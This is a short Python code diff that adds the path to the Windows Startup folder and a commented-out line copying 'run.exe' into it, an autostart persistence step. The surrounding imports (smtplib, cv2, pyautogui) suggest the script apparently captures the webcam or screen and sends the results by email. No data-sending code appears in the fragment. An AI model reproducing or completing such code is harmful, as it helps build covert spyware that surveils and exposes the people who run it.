@@ -1,4 +1,11 @@
-import os,time
+import os,time,shutil
+
+
+startup = ('C:/Users/' + str(os.getlogin()).strip() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+#shutil.copy2('run.exe',startup)
+os.path.basename(__file__)
+
+
 try:
     import smtplib,cv2,pyautogui
     from email.mime.text import MIMEText
